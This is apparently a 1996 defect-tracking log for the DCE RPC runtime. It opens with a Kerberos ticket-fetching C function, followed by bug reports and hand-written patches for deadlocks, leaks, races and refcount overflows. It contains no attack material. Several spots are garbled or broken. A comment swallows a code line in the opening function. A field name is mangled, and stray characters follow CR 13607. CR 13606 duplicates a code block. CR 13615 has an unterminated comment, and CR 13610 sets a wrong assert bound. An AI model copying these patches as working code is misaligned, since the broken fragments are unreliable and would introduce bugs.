(krb_info)
    rpc_krb_info_p_t krb_info;
#endif
{
    error_status_t st = error_status_ok;
    unsigned32 oldexp, exp;
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 19979 */
    sec_krb_cred volatile tmp_cred=NULL;
#endif

    RPC_KRB_INFO_LOCK_ASSERT(krb_info);
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 16500 */
    TRY
#endif
    while (krb_info->cred_fetching) {
        RPC_DBG_PRINTF(rpc_e_dbg_auth, 3,
            ("(rpc__krb_get_tkt) waiting for someone else\n"));
        RPC_KRB_INFO_COND_WAIT(krb_info);
    }
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 16500 */
    CATCH(pthread_cancel_e)
        st = rpc_s_call_cancelled;
    CATCH_ALL
        /*
         * An unexpected exception was raised by threads
         */

        RPC_DCE_SVC_PRINTF ((
        DCE_SVC(RPC__SVC_HANDLE, "%s"),
        rpc_svc_recv,
        svc_c_sev_fatal | svc_c_action_abort,
        rpc_m_unexpected_exc,
        "rpc__krb_get_tkt" ));
    ENDTRY
    /*
     * If status is bad, we caught a cancel
     */

    if (st != rpc_s_ok)
                return st;
#endif
    if (krb_info->creds_valid) {
        RPC_DBG_PRINTF(rpc_e_dbg_auth, 3,
            ("(rpc__krb_get_tkt) already valid\n"));
    } else{
        krb_info->cred_fetching = 1;
#if !defined(AIX_PROD) && !defined(IBMOS2) /* CMVC 19979 */
        /*
         * Lets not free the cred until we have a valid cred from
         * security
         */
        sec_krb_cred_free(&krb_info->cred);
#endif

        oldexp = krb_info->expiration;
        RPC_KRB_INFO_UNLOCK(krb_info);

        /*
         * !!! this is a cancel point here..
         * on cancel, must set cred_fetching to 0.
         */
        RPC_DBG_PRINTF(rpc_e_dbg_auth, 3,
            ("(rpc__krb_get_tkt) fetching credentials\n"));
#if defined (AIX_PROD) || defined (IBMOS2) /* CMVC 10262,16500 */
        /*
         * Change 10262 to return a cancel status instead of reraising
         * the cancellation.
         *
         * We should probably disable general cancellability here because the
         * security runtime's state is unknown if it gets cancelled...
         */

        TRY {
#endif
#if defined(_AIX41) && defined(_KERNEL)  /* change u to dce_u  CMVC 10866 CMVC 1165 CMVCst = sec_krb_get_cred (krb_info->auth_info.dce_u.auth_identity,
#else
        st = sec_krb_get_cred (krb_info->auth_info.u.auth_identity,
#endif
            krb_info->server,
            krb_info->auth_info.authn_level,
            krb_info->auth_info.authz_protocol,
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 19979 */
            (sec_krb_cred*)&tmp_cred, &exp);
#else
            &krb_info->cred, &exp);
#endif


        RPC_KRB_INFO_LOCK (krb_info);
        krb_info->expiration = exp;

        if (st != rpc_s_ok) {
            RPC_DBG_GPRINTF
                (("(rpc__krb_get_tkt) refresh failed (status %x)\n", st));
        }
        else
        {
            RPC_DBG_PRINTF(rpc_e_dbg_auth, 3,
                ("(rpc__krb_get_tkt) fetch succeeded\n"));
            krb_info->creds_valid = 1;
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 19979 */
            /*
             * We have new valid cred. Lets free the old and replace
             * with the new.
             */
            rpc__krb_rel_cred_ref (&krb_info->cred_ref);
            rpc__krb_get_cred_ref (&krb_info->cred_ref, tmp_cred);
#endif
        }
#if defined (AIX_PROD) || defined (IBMOS2) /* CMVC 10262,16500 */
        }
        CATCH(pthread_cancel_e) {
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 19979 */
            /*
             * If a cancel occured lets make sure the cred from
             * security is freed.
             */
            if (tmp_cred) sec_krb_cred_free((sec_krb_cred *)&tmp_cred);
#endif
            RPC_KRB_INFO_LOCK (krb_info);
            st = rpc_s_call_cancelled;
        }
        CATCH_ALL {
            /*
             * An unexpected exception was raised
             */

             RPC_DCE_SVC_PRINTF ((
             DCE_SVC(RPC__SVC_HANDLE, "%s"),
             rpc_svc_recv,
             svc_c_sev_fatal | svc_c_action_abort,
             rpc_m_unexpected_exc,
             "rpc__krb_get_tkt" ));
        }
        ENDTRY
#endif
        krb_info->cred_fetching = 0;
        RPC_KRB_INFO_COND_BROADCAST(krb_info);
    }
    RPC_KRB_INFO_LOCK_ASSERT(krb_info);
    return st;
}



CR Number                     : 13615
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Exception caught on client RPC
Reported Date                 : 8/23/96
Found in Baseline             : 1.1
Found Date                    : 8/23/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnassoc.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public
Reporteption                  : lin1@austin.ibm.com

[8/23/96 public]
The association shutdown occurs during a rpc call when executing client
stub code.  To perform the call, the 'rpc_call_start' function will
setup the connection (association) to the server in 
'rpc__cn_assoc_request'. The shutdown request occurs while performing
'rpc__cn_assoc_open'. Since rpc does not currently have a method
to handle the shutdown status in 'rpc__cn_assoc_request'
code will be modified to retry the assoc open with a new association.

-------------------------------------------------------------------------
Make the following changes in rpc__cn_assoc_request (cnassoc.c):
Add the follwing local variable:
    boolean             retry = false;
Replace the following statements:
                /*
                 * Return a failure immediately if:
                 *
                 * 1) the association open failed because it was
                 *    rejected or a local error occurred OR
                 *
                 * 2) the connection request failed and the binding
                 *    timeout was not infinite.
                 */
                if (!rpc__cn_network_connect_fail (*st))
                {
                    return (NULL);
                }
                else
                {
                    if (binding_r->common.timeout != rpc_c_binding_infinite_timout)                 {
                        return (NULL);
                    }
                }

With the follwing:
                /*
                 * Return a failure immediately if:
                 *
                 * 1) the association open failed because it was
                 *    rejected or a local error occurred OR
                 *
                 * 2) the connection request failed and the binding
                 *    timeout was not infinite.
                 */
#if defined(AIX_PROD) || defined(IBMOS2) 
                /* If we received an 'association shutdown' request, lets
                   try the 'association open' request one more time with a new
                   assocation */
                if (*st != rpc_s_assoc_shutdown)
                {
#endif
                if (!rpc__cn_network_connect_fail (*st))
                {
                    return (NULL);
                }
                else
                {
                    if (binding_r->common.timeout != rpc_c_binding_infinite_timout)                 {
                        return (NULL);
                    }
                }
#if defined(AIX_PROD) || defined(IBMOS2) 
                }
                else if (retry) return(NULL); /* The retry failed, lets return /
                     else retry=true; /* Lets try one more time */
#endif



CR Number                     : 13614
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : nsi calls
Short Description             : rpc_ns_entry_inq_resolution() does not handle cds link cases.
Reported Date                 : 8/22/96
Found in Baseline             : 1.2.1
Found Date                    : 8/22/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/22/96 public]

rpc_ns_entry_inq_resolution() returns bogus unresolved name when a cds link
is part of the input name. In the following example, "resolve" is a simple
program which simply calls rpc_ns_entry_inq_resolution() and prints out the
resolved and unresolved names:

dcecp> link create /.:/l -to /.:/sec
dcecp> ./resolve /.:/sec/abc
Resolved part is /.../down_11/sec, unresolved is abc
dcecp> ./resolve /.:/l/abc
Resolved part is /.../down_11/sec, unresolved is c
dcecp> link create /.:/ll -to /.:/sec
dcecp> ../dce/resolve /.:/ll/abc      
Resolved part is /.../down_11/sec, unresolved is bc
dcecp>

The reason for this strange behavior is that the function assumes that 
no link is used and the resolved part is the same as the first part
of the single name, and return the residual part by copying the rest from the
orginal name starting from the index based on the length of the resolved
part. When in the case of a cds link, the resolved part is the actual (target)
name, its length is NOT the same as the link length, hence the strange
residual part result.

Somewhere, the code needs to be smart to realize that a cds link is in place,
and return the resolved part as: 1. the actual name, 2), the link part.



CR Number                     : 13612
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : llegal state transition in CN server call SM
Reported Date                 : 8/20/96
Found in Baseline             : 1.1
Found Date                    : 8/20/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnsclsm.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/20/96 public]
This problem only occured in very high stressed env.
The server was transmitting a fault packet to the client.
The rpc__cn_call_transmit_fault routine         
in send_call_fault_action_rtn was executed and change the server state
from RPC_C_SERVER_CALL_CALL_REQUEST to RPC_C_SERVER_CALL_CALL_COMPLETED.
The server receiver thread received another request when server was making
the above state change.  Therefore, an illeagal state transition
occured.



CR Number                     : 13611
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Server App deadlocks in context rundown
Reported Date                 : 8/20/96
Found in Baseline             : 1.1
Found Date                    : 8/20/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : rpc/idl/lib/ctxeecli.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/20/96 public]
The server process is in a deadlock situation, therefore, any requests
sent from client will not acquire services.  A thread owns the 
rpc_g_global_mutex.  A number of threads are blocked including
the exector thread and the listening thread.  This thread is waiting
on a condition in rpc_ss_rundown_client which never occured.
rpc_ss_rundown_client did reveal an unprotect condition wait against
cancelation. ALso the refcount in the client handle is -1.  This value
is the cause of the hang in rpc_ss_rundown_client.  According to
the idl code, the reference count of the client handle should
never reach below zero.  This fix is considered a workaround
since the true nature of the problem is not yet revealed.
---------------------------------------------------------------------------
Make the changes in rpc_ss_add_to_callee_client:
After the following existing statments:
    while (ndr_true)
    {
        if ( ctx_client == this_client->client )
        {
            ++this_client->count;
Add the following new statements:
            /* If the ref_count of this client is zero, set it to one. */
            /* I believe the ref count is used to determine whether the */
            /* server stub is finished with this client handle.  At this */
            /* point, the stub is not finished and therefore will later */
            /* decrement the ref count in rpc_ss_ctx_client_ref_count_d_2. */
            /* This change will prevent the ref count from decrementing */
            /* below -1 */
            if (!(this_client->ref_count))
            {
               ++this_client->ref_count;
            }



CR Number                     : 13610
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : cdsadv core dump in rpc__dg_scall_alloc
Reported Date                 : 8/20/96
Found in Baseline             : 1.1
Found Date                    : 8/20/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : dg.h dgsct.h
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/20/96 public]
The abort occurs since the reference count of the scte is 255.
Looking at the core file reveals the call to be a broadcast, maybe type.
Since the call is maybe, rpc will execute the call even if the sequence is 
old or is a duplicate.  rpc will try to uphold the call since a maybe
call does not require a client response. The particular 'scte' which
created the core dump seems to have a number of maybe calls (most
in idle state) stored in the maybe chain.  The limit of the refernce
count should indicate the chain to be near 255 mark.  If we increase 
the reference count to a double bye, the limit would increase to
65536. 
----------------------------------------------------------------------------
Make the following changes to rpc_dg_sct_elt_t (dg.h):
Replace the following existing field:
    unsigned8 refcnt;                   /* scte reference count */
With the following new field:
    unsigned16 refcnt;                   /* scte reference count */
---------------------------------------------------------------------------
Make the following changes to dgsct.h:
Replace the existing statement:
/*
 * R P C _ D G _ S C T _ R E F E R E N C E
 *
 * Increment the reference count for the SCTE.
 */
#define RPC_DG_SCT_REFCNT_MAX  255

#define RPC_DG_SCT_REFERENCE(scte) { \
    assert((scte)->refcnt < RPC_DG_SCT_REFCNT_MAX); \
    (scte)->refcnt++; \
}
With the new statements:
/*
 * R P C _ D G _ S C T _ R E F E R E N C E
 *
 * Increment the reference count for the SCTE.
 */
#define RPC_DG_SCT_REFERENCE(scte) { \
    assert((scte)->refcnt < 65536); \
    (scte)->refcnt++; \
}

[9/04/96 public]

I think that you mean 65535.

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13608
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : DG RPC orphaning packets
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : dgexec.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
Cannot do a cd /: on any of the DFS servers or client in the cell.
It was found out that rpc could not allocate ant more memory.

A few points in the dg code (user space, not kernel) have been 
identified where the DG packets are not being freed in failure
conditions.  With user space RPC this is not generally a problem
because the packet pool is very large, but with KRPC, the packet
pool is restricted to onlt a few hundred
packets at most, so orphaning packets, ie not returning them
to the packet pool, can easily cause a resource threshold to be
hit.  This is especially true in situations where the core DCE services
become unavailable, and error conditions are expected.
-----------------------------------------------------------------------
Make the follwing changes in rpc__dg_execute_call (dgexec.c):
Replace the following existing statements:
            /*
             * We want to make this check because it's better to be safe
             * than sorry regarding at-most-once semantics.  It's
             * conceivable that the connection became WAY validated *after*
             * this call had passed it's initial filtering (if nothing
             * else, it should protect us from other potential coding
             * errors :-)
             */
            if (scall->c.call_seq != scall->scte->high_seq)
            {
                RPC_DBG_PRINTF(rpc_e_dbg_general, 2,
                    ("(execute_call) Old sequence, previous=%lu [%s]\n",
                    scall->scte->high_seq, rpc__dg_act_seq_string(hdrp)));
                goto END_OF_CALL;
            }
With the following new statements:
            /*
             * We want to make this check because it's better to be safe
             * than sorry regarding at-most-once semantics.  It's
             * conceivable that the connection became WAY validated *after*
             * this call had passed it's initial filtering (if nothing
             * else, it should protect us from other potential coding
             * errors :-)
             */
            if (scall->c.call_seq != scall->scte->high_seq)
            {
                RPC_DBG_PRINTF(rpc_e_dbg_general, 2,
                    ("(execute_call) Old sequence, previous=%lu [%s]\n",
                    scall->scte->high_seq, rpc__dg_act_seq_string(hdrp)));
#if defined(AIX_PROD) && defined(_KERNEL) /* CMVC: 14579 */
                KRPC_LOG_TRACE(0, ("rpc execute_call: old sequence"));
#endif /* AIX_PROD && _KERNEL */
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 15224 */
                if (iove.buff_dealloc != NULL)
                    RPC_FREE_IOVE_BUFFER(&iove);
#endif
                goto END_OF_CALL;
            }
------------------------------------------------------------------------------
Replace the following existing statements:
            /*
             * The WAY validation routine must be called with the connection
             * unlocked.  Due to locking hierarchy and the fact that we
             * unlocked the scall, we've opened up a window... check if
             * it's safe to continue.
             */
            RPC_LOCK(0);
            RPC_DG_CALL_LOCK(&scall->c);
            if (scall->c.state != rpc_e_dg_cs_recv)
            {
                RPC_UNLOCK(0);
                goto END_OF_CALL;
            }
Wth the following new statements:
            /*
             * The WAY validation routine must be called with the connection
             * unlocked.  Due to locking hierarchy and the fact that we
             * unlocked the scall, we've opened up a window... check if
             * it's safe to continue.
             */
            RPC_LOCK(0);
            RPC_DG_CALL_LOCK(&scall->c);
            if (scall->c.state != rpc_e_dg_cs_recv)
            {
                RPC_UNLOCK(0);
#if defined(AIX_PROD) && defined(_KERNEL) /* CMVC 15224 */
                KRPC_LOG_TRACE(0,
                    ("rpc execute_call: not in rx state before way, fwa %d",
                    force_way_auth));
#endif /* AIX_PROD && _KERNEL */
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 15224, 23059 */
                if (!force_way_auth && (iove.buff_dealloc != NULL))
                    RPC_FREE_IOVE_BUFFER(&iove);
#endif /* AIX_PROD || IBMOS2 */
                goto END_OF_CALL;
            }
------------------------------------------------------------------------------
Replace the following existing statements:
            /*
             * Before continuing, we've "opened up" the call (due to
             * the unlock/lock) and we need to check if it is safe to
             * continue...
             */
            if (scall->c.state != rpc_e_dg_cs_recv)
                goto END_OF_CALL;

            if (st != rpc_s_ok)
            {
                reject_st = rpc_s_who_are_you_failed;
                goto AFTER_CALL_TO_STUB;
            }
            else
            {
                if (scall->c.call_seq != scall->scte->high_seq)
                {
                    RPC_DBG_PRINTF(rpc_e_dbg_general, 2,
                        ("(rpc__dg_execute_call) Old sequence, previous=%lu [%s\n",
                        scall->scte->high_seq, rpc__dg_act_seq_string(hdrp)));
                    goto END_OF_CALL;
                }
            }

With the following new statements:
            /*
             * Before continuing, we've "opened up" the call (due to
             * the unlock/lock) and we need to check if it is safe to
             * continue...
             */
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 15224, 23059 */
            if (scall->c.state != rpc_e_dg_cs_recv) {
#if defined(AIX_PROD) && defined(_KERNEL) /* CMVC 15224 */
                KRPC_LOG_TRACE(0,
            ("rpc execute_call: not in rx state after way, fwa %d, way st %d",
                    force_way_auth, st));
#endif /* AIX_PROD && _KERNEL */
                if (!force_way_auth && (iove.buff_dealloc != NULL))
                    RPC_FREE_IOVE_BUFFER(&iove);
                goto END_OF_CALL;
            }
#else /* AIX_PROD || IBMOS2 */
            if (scall->c.state != rpc_e_dg_cs_recv)
                goto END_OF_CALL;
#endif /* AIX_PROD || IBMOS2 */

            if (st != rpc_s_ok)
            {
                reject_st = rpc_s_who_are_you_failed;
#if defined(AIX_PROD) && defined(_KERNEL) /* CMVC: 14579 */
                KRPC_LOG_TRACE(0,
                    ("rpc execute_call: way call failed st %d", st));
#endif /* AIX_PROD && _KERNEL */
                goto AFTER_CALL_TO_STUB;
            }
            else
            {
                if (scall->c.call_seq != scall->scte->high_seq)
                {
                    RPC_DBG_PRINTF(rpc_e_dbg_general, 2,
                        ("(rpc__dg_execute_call) Old sequence, previous=%lu [%s]\n",
                        scall->scte->high_seq, rpc__dg_act_seq_string(hdrp)));
#if defined(AIX_PROD) && defined(_KERNEL) /* CMVC: 14579 */
                    KRPC_LOG_TRACE(0,
                        ("rpc execute_call: Old sequence after way call"));
#endif /* AIX_PROD && _KERNEL */
#if defined(AIX_PROD) || defined(IBMOS2) /* CMVC 15224, 23059 */
                    if (!force_way_auth && (iove.buff_dealloc != NULL))
                        RPC_FREE_IOVE_BUFFER(&iove);
#endif
                    goto END_OF_CALL;
                }
            }
-------------------------------------------------------------------------------



CR Number                     : 13607
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Swapper grows to 250MEG with CDS Daemon running
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnxfer.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
CDS Daemeon holding memory.  When adding aliases with LAN server API,
swapper will continually grow.  As the number of aliases increases,
the swapper grows faster. After 1000 aliases are added, the swapper
is at 250MEG. Then next time aliases are added, the swapper
grows fastersince the original 1000 were never deleted and it only 
adds about 600 before swapper.
---------------------------------------------------------------------
When after the iovec is transmitted the buffers in the vec are deallocated.
If this is an authenticated call, the counter for the number of the
buffers needs to be decremented, so that the deallocator will not free the
very last buffer which contains the security trailer info,
The leak is because two such decrements were there in the call chain.
The second decrement causes the last data buffer not being deallocated
in each transmission of fragment. As a result, there are multiple
512K leaks in each call and an about 12K/second leak on 530 when 
running the test.
-----------------------------------------------------------------------------
Make the following changes in the rpc__cn_add_new_iovector_elmt (cnxfer.c)
Replace the following existing statements:    
        /*
         * Deallocate all the buffers except the 1st and last.
         * Then adjust iovector so that we have only 2 elements:
         * the header plus the current stub data.
         */
        if ((call_rep->sec != NULL
             && RPC_CN_CREP_IOVLEN (call_rep) > 3)
            || (call_rep->sec == NULL
                && RPC_CN_CREP_IOVLEN (call_rep) > 2))
        {
            /*
             * rpc__cn_dealloc_buffered_data will always skip the
             * first iovector element (protocol header).  Decrementing
             * iovlen will cause it to skip the last element also.
             */
            RPC_CN_CREP_IOVLEN (call_rep) --;
            rpc__cn_dealloc_buffered_data (call_rep);

            /*
             * Now we rebuild the iovector.  It will have only
             * 2 elements: the header, plus the iovector element
             * which we are processing.
             */
            if (call_rep->sec != NULL)
            {
                RPC_CN_CREP_IOVLEN (call_rep) = 3;
            }
            else
            {
                RPC_CN_CREP_IOVLEN (call_rep) = 2;
            }
            RPC_CN_CREP_CUR_IOV_INDX (call_rep) = 1;
            iov_p = &(RPC_CN_CREP_IOV (call_rep)[1]);
        }

With the following new statements:
        /*
         * Deallocate all the buffers except the 1st and last.
         * Then adjust iovector so that we have only 2 elements:
         * the header plus the current stub data.
         */
        if (RPC_CN_CREP_IOVLEN (call_rep) > 2)
        {
            /*
             * rpc__cn_dealloc_buffered_data will always skip the
             * first iovector element (protocol header).  Decrementing
             * iovlen will cause it to skip the last element also.
             */
            RPC_CN_CREP_IOVLEN (call_rep) --;
            rpc__cn_dealloc_buffered_data (call_rep);

            /*
             * Now we rebuild the iovector.  It will have only
             * 2 elements: the header, plus the iovector element
             * which we are processing.
             */
            RPC_CN_CREP_IOVLEN (call_rep) = 2;
            RPC_CN_CREP_CUR_IOV_INDX (call_rep) = 1;
            iov_p = &(RPC_CN_CREP_IOV (call_rep)[1]);
        }

        /*
         * Make sure to reserve an iovector element for the protocol
         * trailer if required.
         */
        if (call_rep->sec != NULL)
        {
            RPC_CN_CREP_IOVLEN (call_rep)++;
        }









]

     eeRE



CR Number                     : 13606
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : daemons dumping core in md5.MD5Update
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnrcvr.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
During testing integeration of Digital DCE for Window NT with DCE 1.2 for
AIX 4.1 cds daemons core dump serveral times.
--------------------------------------------------------------------------
The fix to receive_packet() in cnrcvr.c:
Before the follwing statements, which are located in the last two statements
in end_for (i = 0;; i++) :
Add the following statements:

        /*
        * Deallocate the raw packet if it exists.
        */
        if (assoc->raw_packet_p != NULL)
        {
            rpc__cn_fragbuf_free (assoc->raw_packet_p);
            assoc->raw_packet_p = NULL;
        }
        /*
        * Deallocate the raw packet if it exists.
        */
        if (assoc->raw_packet_p != NULL)
        {
            rpc__cn_fragbuf_free (assoc->raw_packet_p);
            assoc->raw_packet_p = NULL;
        }



CR Number                     : 13604
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : rpc_mgmt_ep_elt_inq_done got exception
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : comep.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
rpc_mgmt_ep_elt_inq_next call got communication failure for udp. Then the
following API rpc_mgmt_ep_elt_inq_done got exception.
--------------------------------------------------------------------------
chp->num_ents in rpc_mgmt_ep_elt_inq_next() of comep.c was set to non-zero
as an output parameter after the call failed due to communication failure.
The counter is used in rpc_mgmt_ep_elt_inq_done to deallocate tower 
structure.  When communication failure occurs, the tower chain was not
allocated but the counter is not zero.  Memory access violation happens
in rpc_mgmt_ep_elt_inq_done() when it tries to free the non-existing
towers.
----------------------------------------------------------------------------
Make the following changes in rpc_mgmt_ep_elt_inq_next() (comep.c):
After the following existing statements:
                if (*status == rpc_s_call_cancelled)
                    pthread_cancel(pthread_self());
Add the following statements:
              chp->num_ents = 0;

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13603
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Trap in rpc__cn_call_executor
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : cncthd.c cnsclsm.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[8/19/96 public]
A trap in rpc__cn_call_executor occur in the dramatic test.  A timing
window during an orphan call occurs if the call rep is not in queue
state.  'stop_orphan_action_rtn' pop's the association off the call rep
(NULLing out the call_r->assoc) while the executor thread is about to 
call the stub routine.  The fourth parameter passes the assoc->ndr_format
which at the time of the trap is NULLed out.  A change in stop_orphan_action_rtn
is needed not to pop the association.  
================================================================================
The fix to rpc__cn_call_executor (cncthd.c) is as following:

add the local varaible ndr_format:
#if defined(AIX_PROD) || defined(IBMOS2)  /* CMVC 22891 */
    ndr_format_t                ndr_format;
#endif

After the following existing statements:
    /*
     * Mark the call as having executed.
     */
    call_r->call_executed = true;

    /*
     * Enable posting of cancels to this call executor thread.
     * This will also post any queued cancels.
     */
    RPC_DBG_PRINTF (rpc_e_dbg_cancel, RPC_C_CN_DBG_CANCEL,
                   ("(rpc__cn_call_executor) call_rep->%x enabling posting of cancels and posting any queued cancels\n", call_r));
    RPC_CALL_LOCK ((rpc_call_rep_t *) call_r);
Add the follwing new checkings:
#if defined(AIX_PROD) || defined(IBMOS2)  /* CMVC 22891 */
    if (call_r->assoc == NULL)
    {
        /*
         * The receiver thread rip the assoc underneath us.
         * This call could be have been orphaned.
         */
         rpc__cthread_cancel_caf ((rpc_call_rep_t *) call_r);
         RPC_CALL_UNLOCK ((rpc_call_rep_t *) call_r);
         goto CLEANUP;
    }
    else
    {
        /*
         * This call could still be orphaned, therefore, lets
         * copy the NDR format from the assoc into a local variable.
         */
        ndr_format.int_rep=(RPC_CN_ASSOC_NDR_FORMAT (call_r->assoc)).int_rep;
        ndr_format.char_rep=(RPC_CN_ASSOC_NDR_FORMAT (call_r->assoc)).char_rep;
        ndr_format.float_rep=(RPC_CN_ASSOC_NDR_FORMAT (call_r->assoc)).float_rep;
        ndr_format.reserved=(RPC_CN_ASSOC_NDR_FORMAT (call_r->assoc)).reserved;
    }
#endif
Changing the following existing statments:
        ((*server_stub_epv[call_r->opnum]))
        ((handle_t) call_r->binding_rep,
         (rpc_call_handle_t) call_r,
         &iovector.elt[0],
         &(RPC_CN_ASSOC_NDR_FORMAT (call_r->assoc)),
         &call_r->transfer_syntax,
         manager_epv,
         &status);
To the following fixes statements:
        ((*server_stub_epv[call_r->opnum]))
        ((handle_t) call_r->binding_rep,
         (rpc_call_handle_t) call_r,
         &iovector.elt[0],
         &ndr_format,
         &call_r->transfer_syntax,
         manager_epv,
         &status);

Add the following changes in stop_orphan_action_rtn (cnsclsm.c):
Before the following existing statement:     
        rpc__cn_assoc_pop_call (call_rep->assoc, call_rep);
Add the following:        RPC_CALL_LOCK (((rpc_call_rep_t *) call_rep));
After the following existing statement:     
        rpc__cn_assoc_pop_call (call_rep->assoc, call_rep);
Add the following:        RPC_CALL_UNLOCK (((rpc_call_rep_t *) call_rep));

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13602
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : coding error in cs_s_reg.c, rpc__codesets_really_read_file()
Reported Date                 : 8/19/96
Found in Baseline             : 1.1
Found Date                    : 8/19/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
reported by                   : cwang

[8/19/96 public]

This problem was reported by IBM dcemvs (defect 1199), aixdce's corresponding
defect is 21527.

 in module cs_s_reg.c in function rpc__codesets_really_read_file,                                                                   
 when reading the codeset dffective count, the sizeof variable                                                                      
 uses the size of rpc_g_codesets_entry_count instead of                                                                             
 rpc_g_codesets_effective_count.  Since both are defined as                                                                         
 int, this doesn't affect the code processing.  But for cleaness,                                                                   
 this should be fixed.                                                          

Following is the diff of cs_s_reg.c:

319c319
<       if ((read (CsrFile, (char *)(&rpc_g_codesets_effective_count), sizeof(rpc_g_codesets_effective_count))) == -1)
---
>       if ((read (CsrFile, (char *)(&rpc_g_codesets_effective_count), sizeof(rpc_g_codesets_entry_count))) == -1)



CR Number                     : 13601
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : memory leak in rpc_ns_binding_export
